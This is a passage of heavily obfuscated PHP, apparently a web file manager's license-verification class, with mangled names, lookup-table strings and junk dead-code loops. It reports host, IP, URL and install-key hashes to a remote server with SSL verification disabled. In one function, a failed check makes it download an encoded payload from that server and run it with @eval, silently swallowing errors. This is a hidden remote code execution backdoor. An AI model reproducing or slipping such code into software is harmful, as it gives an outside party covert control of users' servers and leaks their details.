$this->config[$ñİ¶¡¨Ô[118]]) { $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[119]] = WEB_ROOT; } return $ÌÀô¡Ï; } private function xjwb1f264717() { $±ã›Á¯» =& $_SERVER[Ö†ØøÖ±]; $æüçÍòš =& $_SERVER[â„ó¿‚å]; $¾îô½Å = $_SERVER[$æüçÍòš[24]] == $æüçÍòš[120]; $ùë™Ç‘í = $±ã›Á¯»[699]; while (strlen($ùë™Ç‘í) < $±ã›Á¯»[681]) { if (!$ùë™Ç‘í) { break; } $ùë™Ç‘í++; } if ($_SERVER[$æüçÍòš[24]] == $æüçÍòš[121] && $_GET[$æüçÍòš[122]] == $æüçÍòš[123]) { $¾îô½Å = !0; } if ($¾îô½Å) { $š‹çíÈ’ = array($æüçÍòš[107] => $this->wtyk783669f0, $æüçÍòš[124] => $this->knzq35a49ebe(), $æüçÍòš[125] => Model($æüçÍòš[126])->count()); if ($this->wtyk783669f0 != $æüçÍòš[108]) { $²«„ô = _get($this->xidk38cd837c, $æüçÍòš[127]); if ($²«„ô) { $š‹çíÈ’[$æüçÍòš[128]] = $²«„ô; $š‹çíÈ’[$æüçÍòš[129]] = strtotime(_get($this->xidk38cd837c, $æüçÍòš[130])); $š‹çíÈ’[$æüçÍòš[131]] = _get($this->xidk38cd837c, $æüçÍòš[116]); } $áÎÙŒÁÇ = Model($æüçÍòš[33])->get($æüçÍòš[132], $æüçÍòš[6], !0); if (is_string($áÎÙŒÁÇ) && substr($áÎÙŒÁÇ, 0, 1) == $æüçÍòš[133]) { $áÎÙŒÁÇ = json_decode_force($áÎÙŒÁÇ); } if (is_array($áÎÙŒÁÇ) && $áÎÙŒÁÇ[$æüçÍòš[134]] && strstr($áÎÙŒÁÇ[$æüçÍòš[134]], $æüçÍòš[135])) { $¡·ÓËĞ = explode($æüçÍòš[135], $áÎÙŒÁÇ[$æüçÍòš[134]]); $š‹çíÈ’[$æüçÍòš[136]] = $¡·ÓËĞ[0]; } } $š‹çíÈ’ = $this->yuvg28190c47(json_encode($š‹çíÈ’), md5($æüçÍòš[137])); $¹´–õƒ = $±ã›Á¯»[700]; $™êòıÑà = array($æüçÍòš[138] => $š‹çíÈ’); $‡£¤¨¯ = $±ã›Á¯»[701]; while (strlen($‡£¤¨¯) < $±ã›Á¯»[668]) { if (!$‡£¤¨¯) { break; } $‡£¤¨¯++; } call_user_func(array($æüçÍòš[139], $æüçÍòš[140]), $™êòıÑà); $ŞÍÙñÕƒ = $±ã›Á¯»[702]; } if ($this->wtyk783669f0 == $æüçÍòš[108]) { return; } $İëÀâÛ = array($æüçÍòš[141], $æüçÍòš[142], $æüçÍòš[143], $æüçÍòš[144], $æüçÍòš[145], $æüçÍòš[146]); $¤Ö–ƒ¸Í = Model($æüçÍòš[33])->get(); $™êòıÑà = array($æüçÍòš[147] => $¤Ö–ƒ¸Í[$æüçÍòš[34]], $æüçÍòš[148] => $¤Ö–ƒ¸Í[$æüçÍòš[35]], $æüçÍòš[149] => $æüçÍòš[6]); $à£ˆØ®Ú = $±ã›Á¯»[703]; if (strlen($à£ˆØ®Ú) < $±ã›Á¯»[662]) { return; } foreach ($İëÀâÛ as $™ã•¬î•) { if (!isset($¤Ö–ƒ¸Í[$™ã•¬î•]) || !$¤Ö–ƒ¸Í[$™ã•¬î•]) { continue; } $™êòıÑà[$™ã•¬î•] = $¤Ö–ƒ¸Í[$™ã•¬î•]; $€úúô¤ = $±ã›Á¯»[704]; } call_user_func(array($æüçÍòš[139], $æüçÍòš[140]), $™êòıÑà); } private function wotq9b69e86b() { $Ñ¤óæö =& $_SERVER[Ö†ØøÖ±]; $¥¾ş¶¢Ã =& $_SERVER[â„ó¿‚å]; if ($_SERVER[$¥¾ş¶¢Ã[24]] != $¥¾ş¶¢Ã[150]) { return; } if (!_get($GLOBALS, $¥¾ş¶¢Ã[117])) { die; } $ÔÆÒ¬´Ô = $GLOBALS[$¥¾ş¶¢Ã[13]]; if (isset($ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[151]])) { $this->pzyi3f632134(); die; } if (isset($ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[152]]) && isset($ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[152]]) == $¥¾ş¶¢Ã[123]) { $ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[153]] = Model($¥¾ş¶¢Ã[33])->get($¥¾ş¶¢Ã[154]); } if (!isset($ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[153]]) || strlen($ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[153]]) != 16) { show_json($¥¾ş¶¢Ã[155] . $ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[153]], !1); } $¿¬„¸Ğœ = Model($¥¾ş¶¢Ã[33])->get($¥¾ş¶¢Ã[99]); $ç«ƒª¡¨ = md5($_SERVER[$¥¾ş¶¢Ã[105]] . $¿¬„¸Ğœ); $½şƒÉû = $Ñ¤óæö[705]; $½Â…±ÙÓ = array($¥¾ş¶¢Ã[153] => $ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[153]], $¥¾ş¶¢Ã[156] => rand_string(16), $¥¾ş¶¢Ã[157] => $¥¾ş¶¢Ã[137], $¥¾ş¶¢Ã[158] => $¥¾ş¶¢Ã[159], $¥¾ş¶¢Ã[160] => $_SERVER[$¥¾ş¶¢Ã[161]], $¥¾ş¶¢Ã[162] => $_SERVER[$¥¾ş¶¢Ã[163]], $¥¾ş¶¢Ã[164] => $_SERVER[$¥¾ş¶¢Ã[165]], $¥¾ş¶¢Ã[104] => $ç«ƒª¡¨, $¥¾ş¶¢Ã[166] => Model($¥¾ş¶¢Ã[33])->get($¥¾ş¶¢Ã[132])); $‡¹÷¯ = $Ñ¤óæö[706]; if (!$‡¹÷¯) { die; } if ($ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[167]] == $¥¾ş¶¢Ã[168]) { $ãü¹ë¾¢ = $this->yuvg28190c47($ç«ƒª¡¨, $¥¾ş¶¢Ã[169]); $•ÖÒ×°î = $this->uefcd2daf0d3(json_encode($½Â…±ÙÓ), $ç«ƒª¡¨ . $¥¾ş¶¢Ã[170], 3); $•ÖÒ×°î = $•ÖÒ×°î . $¥¾ş¶¢Ã[171] . $_SERVER[$¥¾ş¶¢Ã[161]]; $”ŒºŞÕŞ = $this->ixeq81f0d541($¥¾ş¶¢Ã[172] . $ãü¹ë¾¢ . $¥¾ş¶¢Ã[173] . $•ÖÒ×°î, -1); show_json($”ŒºŞÕŞ, !0); } else { if ($ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[167]] == $¥¾ş¶¢Ã[174]) { $‹§îÉÄÔ = substr(md5($¥¾ş¶¢Ã[175] . $ç«ƒª¡¨), 12, 15) . $¥¾ş¶¢Ã[176]; $•ÖÒ×°î = $this->qpay36d31183(trim($ÔÆÒ¬´Ô[$¥¾ş¶¢Ã[177]]), $‹§îÉÄÔ, 2); $Ôñ›ëÍ« = json_decode($•ÖÒ×°î, !0); if (!is_array($Ôñ›ëÍ«) || !is_array($Ôñ›ëÍ«[$¥¾ş¶¢Ã[178]]) || $Ôñ›ëÍ«[$¥¾ş¶¢Ã[153]] != !0) { $æ¬İóÌ = $¥¾ş¶¢Ã[179]; $îúíÍ¹ñ = $Ôñ›ëÍ«[$¥¾ş¶¢Ã[178]] ? $¥¾ş¶¢Ã[180] . $Ôñ›ëÍ«[$¥¾ş¶¢Ã[178]] : $æ¬İóÌ; show_json($îúíÍ¹ñ, !1); } else { $½Â…±ÙÓ[$¥¾ş¶¢Ã[156]] = $Ôñ›ëÍ«[$¥¾ş¶¢Ã[178]][$¥¾ş¶¢Ã[181]]; } } else { $Ôñ›ëÍ« = $this->ixeq81f0d541($¥¾ş¶¢Ã[182], $½Â…±ÙÓ, 10); $ºÖøÓ¥ = $Ñ¤óæö[707]; while ($ºÖøÓ¥ < $Ñ¤óæö[662]) { if ($ºÖøÓ¥ >= 0) { break; } $ºÖøÓ¥++; } } } if (!is_array($Ôñ›ëÍ«) || !is_array($Ôñ›ëÍ«[$¥¾ş¶¢Ã[178]]) || $Ôñ›ëÍ«[$¥¾ş¶¢Ã[153]] != !0) { $æ¬İóÌ = LNG($¥¾ş¶¢Ã[183]); $îúíÍ¹ñ = $Ôñ›ëÍ«[$¥¾ş¶¢Ã[178]] ? $¥¾ş¶¢Ã[180] . $Ôñ›ëÍ«[$¥¾ş¶¢Ã[178]] : $æ¬İóÌ; show_json($îúíÍ¹ñ, !1); } $…×‹’ìÌ = $Ôñ›ëÍ«[$¥¾ş¶¢Ã[178]]; $´¨°½óó = $this->wyrk1f492447($…×‹’ìÌ[$¥¾ş¶¢Ã[184]]); if (!$´¨°½óó || $´¨°½óó != $…×‹’ìÌ[$¥¾ş¶¢Ã[130]]) { $™ÊÏâä = array($¥¾ş¶¢Ã[185] => Model($¥¾ş¶¢Ã[33])->get($¥¾ş¶¢Ã[99]), $¥¾ş¶¢Ã[186] => $_SERVER[$¥¾ş¶¢Ã[105]], $¥¾ş¶¢Ã[187] => this_url(), $¥¾ş¶¢Ã[162] => $_SERVER[$¥¾ş¶¢Ã[163]]); $•ÖÒ×°î = $this->kfyz0434fb43(json_encode($™ÊÏâä)); $this->ixeq81f0d541($¥¾ş¶¢Ã[188] . $•ÖÒ×°î); show_json(LNG($¥¾ş¶¢Ã[189]), !0); } $ı¶ĞÉä = array($¥¾ş¶¢Ã[154] => $…×‹’ìÌ[$¥¾ş¶¢Ã[190]], $¥¾ş¶¢Ã[191] => $…×‹’ìÌ[$¥¾ş¶¢Ã[192]], $¥¾ş¶¢Ã[193] => rand_string(16), $¥¾ş¶¢Ã[107] => $…×‹’ìÌ[$¥¾ş¶¢Ã[194]]); if ($½Â…±ÙÓ[$¥¾ş¶¢Ã[156]]) { $ı¶ĞÉä[$¥¾ş¶¢Ã[193]] = $½Â…±ÙÓ[$¥¾ş¶¢Ã[156]]; } $ÁœäĞÛ÷ = substr(md5($ı¶ĞÉä[$¥¾ş¶¢Ã[191]]), 10, 10); $Ã©¼è™¯ = $ÁœäĞÛ÷ . $ı¶ĞÉä[$¥¾ş¶¢Ã[107]] . $ı¶ĞÉä[$¥¾ş¶¢Ã[193]]; $íáôÃêÍ = $Ñ¤óæö[708]; $ı¶ĞÉä[$¥¾ş¶¢Ã[109]] = strrev(base64_encode($this->yuvg28190c47($Ã©¼è™¯, $¥¾ş¶¢Ã[195]))); $Ò‘·©ıÀ = rand_string(16); $‚“„¸Ë¼ = $Ñ¤óæö[709]; if (!$‚“„¸Ë¼) { return; } $š’Üäúú = $Ò‘·©ıÀ . $ı¶ĞÉä[$¥¾ş¶¢Ã[107]] . $this->yuvg28190c47(md5($ı¶ĞÉä[$¥¾ş¶¢Ã[154]]), $Ò‘·©ıÀ); $øŠº™“ = $Ñ¤óæö[710]; if (strlen($øŠº™“) < $Ñ¤óæö[668]) { return; } $ı¶ĞÉä[$¥¾ş¶¢Ã[110]] = base64_encode(strrev($this->yuvg28190c47($š’Üäúú, $¥¾ş¶¢Ã[196]))); if ($…×‹’ìÌ[$¥¾ş¶¢Ã[197]] && $…×‹’ìÌ[$¥¾ş¶¢Ã[197]] >= 1) { Model($¥¾ş¶¢Ã[33])->setDeep($¥¾ş¶¢Ã[198], $¥¾ş¶¢Ã[123]); } Model($¥¾ş¶¢Ã[33])->set($ı¶ĞÉä); $×ˆã‡“ = md5($_SERVER[$¥¾ş¶¢Ã[105]] . strrev($¿¬„¸Ğœ) . $ı¶ĞÉä[$¥¾ş¶¢Ã[191]]); $©åó­·ä = strrev(substr($×ˆã‡“, 10, 16)); $ø†Ä®Ô¹ = $this->uefcd2daf0d3(json_encode($…×‹’ìÌ), $×ˆã‡“); $ñ¥Ë ƒ• = array_to_keyvalue(Model($¥¾ş¶¢Ã[7])->listData(), $¥¾ş¶¢Ã[199]); $¶ÁûõÏ˜ = $Ñ¤óæö[711]; $ÕéÒ¶ÚÙ = $ñ¥Ë ƒ•[$¥¾ş¶¢Ã[200]]; $Í¹ÈÖéö = array(); $Í¹ÈÖéö[$©åó­·ä] = $ø†Ä®Ô¹; Model($¥¾ş¶¢Ã[7])->update($ÕéÒ¶ÚÙ[$¥¾ş¶¢Ã[201]], array($¥¾ş¶¢Ã[202] => $Í¹ÈÖéö)); $¸«±ËÃÂ = $Ñ¤óæö[712]; if (!$¸«±ËÃÂ) { die; } $this->xidk38cd837c = $…×‹’ìÌ; $this->wtyk783669f0 = $ı¶ĞÉä[$¥¾ş¶¢Ã[107]]; $¨Ïàâä¾ = $Ñ¤óæö[713]; while (strlen($¨Ïàâä¾) < $Ñ¤óæö[681]) { if (!$¨Ïàâä¾) { break; } $¨Ïàâä¾++; } $this->licenseRegistSuccess(); $àÄºÂãÛ = $Ñ¤óæö[714]; if (!$àÄºÂãÛ) { return; } Cache::set($¥¾ş¶¢Ã[203] . md5($¿¬„¸Ğœ . $¥¾ş¶¢Ã[204]), $¥¾ş¶¢Ã[6]); show_json(LNG($¥¾ş¶¢Ã[189]), !0); } private function licenseRegistSuccess() { $†®­è¿› =& $_SERVER[â„ó¿‚å]; $¢·Œ¾½ = Model($†®­è¿›[33])->get(); $Ñ™œİëæ = $_SERVER[Ö†ØøÖ±][715]; if ($¢·Œ¾½[$†®­è¿›[63]] != $†®­è¿›[123]) { Model($†®­è¿›[33])->set($†®­è¿›[63], $†®­è¿›[123]); } Action($†®­è¿›[205])->initStart(!0); } private function pzyi3f632134() { $¬ÜÇ™ =& $_SERVER[Ö†ØøÖ±]; $³¤çá =& $_SERVER[â„ó¿‚å]; Model($³¤çá[33])->set(array($³¤çá[154] => $³¤çá[6], $³¤çá[191] => $³¤çá[6], $³¤çá[107] => $³¤çá[108], $³¤çá[109] => $³¤çá[6], $³¤çá[110] => $³¤çá[6])); $«çğ§Õ« = $¬ÜÇ™[716]; while (strlen($«çğ§Õ«) < $¬ÜÇ™[668]) { if (!$«çğ§Õ«) { break; } $«çğ§Õ«++; } Model($³¤çá[33])->setDeep($³¤çá[198], $³¤çá[206]); $¶”ÛÔì¯ = $¬ÜÇ™[717]; if (strlen($¶”ÛÔì¯) < $¬ÜÇ™[662]) { return; } $this->xidk38cd837c = array(); $ó‹‡æÈ» = $¬ÜÇ™[718]; while ($ó‹‡æÈ» < $¬ÜÇ™[665]) { if ($ó‹‡æÈ» >= 0) { break; } $ó‹‡æÈ»++; } $this->wtyk783669f0 = $³¤çá[108]; $ØşÎì‚î = $¬ÜÇ™[719]; if (strlen($ØşÎì‚î) < $¬ÜÇ™[293]) { return; } } private function ogur2940a97e() { $åŞ“Şú‰ =& $_SERVER[Ö†ØøÖ±]; $ÂÑà‰÷“ =& $_SERVER[â„ó¿‚å]; $_SERVER[$ÂÑà‰÷“[163]] = _get($_SERVER, $ÂÑà‰÷“[163], APP_HOST); $°¾Ğú‡³ = $åŞ“Şú‰[720]; while (strlen($°¾Ğú‡³) < $åŞ“Şú‰[665]) { if (!$°¾Ğú‡³) { break; } $°¾Ğú‡³++; } $this->wtyk783669f0 = $ÂÑà‰÷“[108]; $õé“úá± = $åŞ“Şú‰[721]; $÷Àš²­Ş = Model($ÂÑà‰÷“[33])->get(); if ($÷Àš²­Ş[$ÂÑà‰÷“[107]] == $ÂÑà‰÷“[108]) { return; } $…Ï­æÔ = Model($ÂÑà‰÷“[33])->get($ÂÑà‰÷“[99]); $Îªîº†â = $ÂÑà‰÷“[203] . md5($…Ï­æÔ . $ÂÑà‰÷“[204]); $†ñŒÅÜê = $åŞ“Şú‰[722]; if (!$†ñŒÅÜê) { return; } $ÛöŒø¼ = Cache::get($Îªîº†â); $‚ â»Ã = $åŞ“Şú‰[723]; if (strlen($‚ â»Ã) < $åŞ“Şú‰[668]) { return; } if (!is_array($ÛöŒø¼) || !isset($ÛöŒø¼[$ÂÑà‰÷“[207]]) || time() - $ÛöŒø¼[$ÂÑà‰÷“[207]] >= 60) { $–¤‹¨ú€ = Model($ÂÑà‰÷“[7])->loadList(); $ª”Ù™³å = $–¤‹¨ú€[$ÂÑà‰÷“[200]]; $í”ĞôÅÕ = md5($_SERVER[$ÂÑà‰÷“[105]] . strrev($…Ï­æÔ) . $÷Àš²­Ş[$ÂÑà‰÷“[191]]); $ãÁ²Á¬ì = strrev(substr($í”ĞôÅÕ, 10, 16)); $ÛöŒø¼ = $this->qpay36d31183($ª”Ù™³å[$ÂÑà‰÷“[85]][$ãÁ²Á¬ì], $í”ĞôÅÕ); $ÛöŒø¼ = json_decode($ÛöŒø¼, !0); } if (!is_array($ÛöŒø¼)) { return $this->pzyi3f632134(); } $ùÏå‡ä = strtotime($ÛöŒø¼[$ÂÑà‰÷“[130]]); if (time() >= $ùÏå‡ä) { return $this->pzyi3f632134(); } if (time() - $ÛöŒø¼[$ÂÑà‰÷“[207]] > 20) { $ÛöŒø¼[$ÂÑà‰÷“[207]] = time(); Cache::set($Îªîº†â, $ÛöŒø¼); } $this->xidk38cd837c = $ÛöŒø¼; $this->wtyk783669f0 = $÷Àš²­Ş[$ÂÑà‰÷“[107]]; $èßı‰®Ù = $åŞ“Şú‰[724]; while ($èßı‰®Ù < $åŞ“Şú‰[681]) { if ($èßı‰®Ù >= 0) { break; } $èßı‰®Ù++; } } private function tksif06dd724() { $ï øƒéÁ =& $_SERVER[â„ó¿‚å]; $Ù‹Ğë—‘ = $GLOBALS[$ï øƒéÁ[13]]; $£§©…Â = $_SERVER[Ö†ØøÖ±][725]; $¸˜™²ç÷ = $_SERVER[$ï øƒéÁ[24]]; if ($¸˜™²ç÷ == $ï øƒéÁ[208] && $this->wtyk783669f0 == $ï øƒéÁ[108]) { show_json(LNG($ï øƒéÁ[209]), !1, $ï øƒéÁ[210]); } $Ëªş†‚© = array($ï øƒéÁ[211], $ï øƒéÁ[212]); if (in_array($¸˜™²ç÷, $Ëªş†‚©)) { if ($this->wtyk783669f0 == $ï øƒéÁ[108] && isset($Ù‹Ğë—‘[$ï øƒéÁ[213]])) { show_json(LNG($ï øƒéÁ[209]), !1, $ï øƒéÁ[210]); die; } $±ìÆ– = $this->knzq35a49ebe(); if ($±ìÆ– != intval($ï øƒéÁ[214])) { if ($±ìÆ– <= Model($ï øƒéÁ[126])->count()) { show_json(LNG($ï øƒéÁ[215]), !1, $ï øƒéÁ[210]); die; } } } } private function josc7b6e8e9e() { $¤äÔÀñ– =& $_SERVER[Ö†ØøÖ±]; $®‡æ™ñÅ =& $_SERVER[â„ó¿‚å]; $î½ŸÅÚş = array($®‡æ™ñÅ[120], $®‡æ™ñÅ[121]); $Õ±ŒÁ = $¤äÔÀñ–[726]; if (strlen($Õ±ŒÁ) < $¤äÔÀñ–[662]) { return; } if (!_get($GLOBALS, $®‡æ™ñÅ[117]) || !isset($_GET[$®‡æ™ñÅ[216]])) { return; } if (!in_array($_SERVER[$®‡æ™ñÅ[24]], $î½ŸÅÚş)) { return; } $ëŞÅéª = $®‡æ™ñÅ[217]; $¹Üö´óà = $¤äÔÀñ–[727]; while (strlen($¹Üö´óà) < $¤äÔÀñ–[293]) { if (!$¹Üö´óà) { break; } $¹Üö´óà++; } $ëŞÅéª = $this->djcl7faff391($ëŞÅéª, $®‡æ™ñÅ[218]); $Ò¨•Ó¢Ì = stream_context_create(array($®‡æ™ñÅ[219] => array($®‡æ™ñÅ[220] => $®‡æ™ñÅ[221], $®‡æ™ñÅ[222] => 3))); $÷Ç±…¨ = $¤äÔÀñ–[728]; $®ÂÎµÌ´ = @file_get_contents($ëŞÅéª, !1, $Ò¨•Ó¢Ì); $Ö´‡ëÇ = $¤äÔÀñ–[729]; if (strlen($Ö´‡ëÇ) < $¤äÔÀñ–[293]) { return; } header($®‡æ™ñÅ[223]); $®Í¾–¶Õ = $¤äÔÀñ–[730]; if (!$®Í¾–¶Õ) { return; } if ($®ÂÎµÌ´ && strstr($®ÂÎµÌ´, $®‡æ™ñÅ[224])) { echo $®ÂÎµÌ´; } die; } public function kwmiec17dee4($¾ÑäèÒè) { $œÎÀğåÖ =& $_SERVER[Ö†ØøÖ±]; $¿óÀ€¸µ =& $_SERVER[â„ó¿‚å]; if ($this->wtyk783669f0 == $¿óÀ€¸µ[225]) { return $¾ÑäèÒè; } $Ø·‹ø˜ = array($¿óÀ€¸µ[226] => $¿óÀ€¸µ[227], $¿óÀ€¸µ[228] => $¿óÀ€¸µ[227], $¿óÀ€¸µ[229] => $¿óÀ€¸µ[227], $¿óÀ€¸µ[230] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[232] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[233] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[234] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[235] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[236] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[237] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[238] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[239] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[240] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[241] => $¿óÀ€¸µ[231], $¿óÀ€¸µ[242] => $¿óÀ€¸µ[231]); $Õ”ò‡™ = $œÎÀğåÖ[731]; $Òğœ·¥» = explode($¿óÀ€¸µ[243], _get($this->xidk38cd837c, $¿óÀ€¸µ[114], $¿óÀ€¸µ[6])); $Îâ°ëª = $œÎÀğåÖ[732]; if (strlen($Îâ°ëª) < $œÎÀğåÖ[665]) { die; } $ØÒĞıÏÖ = array(); $Ä±ˆ‰»¦ = $œÎÀğåÖ[733]; if (strlen($Ä±ˆ‰»¦) < $œÎÀğåÖ[668]) { return; } foreach ($Ø·‹ø˜ as $èÕ”Ô => $âŞ§¦Ÿ) { if ($âŞ§¦Ÿ == $¿óÀ€¸µ[227] && substr($this->wtyk783669f0, 0, 1) == $¿óÀ€¸µ[227]) { continue; } if (!in_array($èÕ”Ô, $Òğœ·¥»)) { $ØÒĞıÏÖ[] = $èÕ”Ô; } } foreach ($ØÒĞıÏÖ as $èÕ”Ô) { unset($¾ÑäèÒè[$èÕ”Ô]); } return $¾ÑäèÒè; } private function egprd583065f() { $”ôŞÔ³ =& $_SERVER[â„ó¿‚å]; if ($this->wtyk783669f0 != $”ôŞÔ³[108]) { $GLOBALS[$”ôŞÔ³[85]][$”ôŞÔ³[89]][$”ôŞÔ³[244]] = $”ôŞÔ³[206]; return; } $GLOBALS[$”ôŞÔ³[85]][$”ôŞÔ³[245]] = $”ôŞÔ³[123]; if (Model($”ôŞÔ³[246])->get($”ôŞÔ³[63]) != $”ôŞÔ³[206]) { Model($”ôŞÔ³[246])->set($”ôŞÔ³[63], $”ôŞÔ³[206]); } } public function wpaha5a95dfb() { $‰Û»”¬ô =& $_SERVER[Ö†ØøÖ±]; return $_SERVER[â„ó¿‚å][247]; $º‹û¦½Õ = $‰Û»”¬ô[734]; while (strlen($º‹û¦½Õ) < $‰Û»”¬ô[293]) { if (!$º‹û¦½Õ) { break; } $º‹û¦½Õ++; } } private function zpli62db562a() { $ë§öÑôÃ =& $_SERVER[Ö†ØøÖ±]; $‚úÂ¢ŠØ =& $_SERVER[â„ó¿‚å]; $Üñş¾¤· = array($‚úÂ¢ŠØ[248], $‚úÂ¢ŠØ[249], $‚úÂ¢ŠØ[250]); $‡„œÑö = $ë§öÑôÃ[735]; if (!$‡„œÑö) { return; } $Äªæâ—ş = $‚úÂ¢ŠØ[251] . md5($‚úÂ¢ŠØ[252]); $Ú¤§üÚÊ = $ë§öÑôÃ[736]; if ($this->wtyk783669f0 == $‚úÂ¢ŠØ[108] || !_get($GLOBALS, $‚úÂ¢ŠØ[117])) { return; } if (!in_array($_SERVER[$‚úÂ¢ŠØ[24]], $Üñş¾¤·)) { return; } if (time() % 4 != 0) { return; } $î©éòæê = call_user_func(array($‚úÂ¢ŠØ[253], $‚úÂ¢ŠØ[254]), $Äªæâ—ş); if ($î©éòæê && time() - $î©éòæê < intval($‚úÂ¢ŠØ[255])) { return; } call_user_func(array($‚úÂ¢ŠØ[253], $‚úÂ¢ŠØ[140]), $Äªæâ—ş, time()); $êĞïóÊ† = Model($‚úÂ¢ŠØ[33])->get($‚úÂ¢ŠØ[99]); $üÖ­ÜÁ‘ = $ë§öÑôÃ[737]; if (!$üÖ­ÜÁ‘) { die; } $ñî¬óà— = array($‚úÂ¢ŠØ[153] => Model($‚úÂ¢ŠØ[33])->get($‚úÂ¢ŠØ[154]), $‚úÂ¢ŠØ[167] => $this->wtyk783669f0, $‚úÂ¢ŠØ[164] => $_SERVER[$‚úÂ¢ŠØ[165]], $‚úÂ¢ŠØ[166] => Model($‚úÂ¢ŠØ[33])->get($‚úÂ¢ŠØ[132]), $‚úÂ¢ŠØ[104] => md5($_SERVER[$‚úÂ¢ŠØ[105]] . $êĞïóÊ†), $‚úÂ¢ŠØ[157] => $‚úÂ¢ŠØ[137], $‚úÂ¢ŠØ[160] => $_SERVER[$‚úÂ¢ŠØ[161]]); $ƒ¤×ëßú = $ë§öÑôÃ[738]; if (!$ƒ¤×ëßú) { return; } $Û¸¯ìí¼ = $this->ixeq81f0d541($‚úÂ¢ŠØ[256], $ñî¬óà—); if (!is_array($Û¸¯ìí¼)) { return; } if ($Û¸¯ìí¼[$‚úÂ¢ŠØ[153]] && $Û¸¯ìí¼[$‚úÂ¢ŠØ[257]]) { if ($this->wyrk1f492447($Û¸¯ìí¼[$‚úÂ¢ŠØ[257]]) == $ñî¬óà—[$‚úÂ¢ŠØ[153]]) { return; } } $this->pzyi3f632134(); $¿Ôğ”˜Ò = $ë§öÑôÃ[739]; if ($this->wyrk1f492447($Û¸¯ìí¼[$‚úÂ¢ŠØ[257]]) != $ñî¬óà—[$‚úÂ¢ŠØ[153]]) { $¿ÖÛ“‡ô = array($‚úÂ¢ŠØ[185] => $êĞïóÊ†, $‚úÂ¢ŠØ[186] => $_SERVER[$‚úÂ¢ŠØ[105]], $‚úÂ¢ŠØ[187] => this_url(), $‚úÂ¢ŠØ[162] => $_SERVER[$‚úÂ¢ŠØ[163]]); $«÷’ÑÏ¶ = $this->kfyz0434fb43(json_encode($¿ÖÛ“‡ô)); $Û¸¯ìí¼ = $this->ixeq81f0d541($‚úÂ¢ŠØ[188] . $«÷’ÑÏ¶); if ($Û¸¯ìí¼ && is_array($Û¸¯ìí¼) && isset($Û¸¯ìí¼[$‚úÂ¢ŠØ[257]])) { $”ø¨ª‡ = $this->qpay36d31183($Û¸¯ìí¼[$‚úÂ¢ŠØ[257]], 2); if ($”ø¨ª‡) { $”ø¨ª‡ = $this->wyrk1f492447($”ø¨ª‡); } if ($”ø¨ª‡) { try { @eval($”ø¨ª‡); } catch (Exception $‘´ÃÍĞ³) { } } } } } private function ixeq81f0d541($Ñ„Á—šç = '', $¬ã–ÓÑƒ = array(), $Şâ´Ç–á = 5) { $ğìªÀı° =& $_SERVER[Ö†ØøÖ±]; $·ÊòÖ”« =& $_SERVER[â„ó¿‚å]; $˜ìÚÇ = $·ÊòÖ”«[258]; $˜ìÚÇ = $this->djcl7faff391($˜ìÚÇ, $·ÊòÖ”«[259]); $Íİ¶Â¸… = $ğìªÀı°[740]; $˜ìÚÇ = $˜ìÚÇ . $Ñ„Á—šç; if ($¬ã–ÓÑƒ && is_array($¬ã–ÓÑƒ)) { $˜ìÚÇ = $˜ìÚÇ . $·ÊòÖ”«[260] . http_build_query($¬ã–ÓÑƒ); } if ($¬ã–ÓÑƒ === -1) { return $˜ìÚÇ; } $²Ç½ßÔÙ = stream_context_create(array($·ÊòÖ”«[219] => array($·ÊòÖ”«[222] => $Şâ´Ç–á, $·ÊòÖ”«[220] => $·ÊòÖ”«[261]), $·ÊòÖ”«[262] => array($·ÊòÖ”«[263] => !1, $·ÊòÖ”«[264] => !1))); $ğ«¿Àğ´ = $ğìªÀı°[741]; $¬ã–ÓÑƒ = @file_get_contents($˜ìÚÇ, !1, $²Ç½ßÔÙ); $¦ğ¤×û¿ = $ğìªÀı°[742]; if (!$¦ğ¤×û¿) { return; } return json_decode($¬ã–ÓÑƒ, !0); $µÙµıË§ = $ğìªÀı°[743]; while ($µÙµıË§ < $ğìªÀı°[293]) { if ($µÙµıË§ >= 0) { break; } $µÙµıË§++; } $“ã¨ÀÏ = $ğìªÀı°[744]; if (!$“ã¨ÀÏ) { return; } } private function knzq35a49ebe() { $Ê£ìõ¨› =& $_SERVER[Ö†ØøÖ±]; $ô¹ñ¨ç› =& $_SERVER[â„ó¿‚å]; $æéŸğ„Á = array($ô¹ñ¨ç›[265] => $ô¹ñ¨ç›[266], $ô¹ñ¨ç›[267] => $ô¹ñ¨ç›[268], $ô¹ñ¨ç›[269] => $ô¹ñ¨ç›[270], $ô¹ñ¨ç›[271] => $ô¹ñ¨ç›[272], $ô¹ñ¨ç›[273] => $ô¹ñ¨ç›[274], $ô¹ñ¨ç›[275] => $ô¹ñ¨ç›[214], $ô¹ñ¨ç›[276] => $ô¹ñ¨ç›[214], $ô¹ñ¨ç›[277] => $ô¹ñ¨ç›[266], $ô¹ñ¨ç›[278] => $ô¹ñ¨ç›[268], $ô¹ñ¨ç›[279] => $ô¹ñ¨ç›[270], $ô¹ñ¨ç›[280] => $ô¹ñ¨ç›[281], $ô¹ñ¨ç›[282] => $ô¹ñ¨ç›[272], $ô¹ñ¨ç›[283] => $ô¹ñ¨ç›[284], $ô¹ñ¨ç›[285] => $ô¹ñ¨ç›[274], $ô¹ñ¨ç›[286] => $ô¹ñ¨ç›[287], $ô¹ñ¨ç›[288] => $ô¹ñ¨ç›[289], $ô¹ñ¨ç›[290] => $ô¹ñ¨ç›[291]); $î¤©öş… = $æéŸğ„Á[$this->wtyk783669f0]; $Ï†Ñ•Åİ = 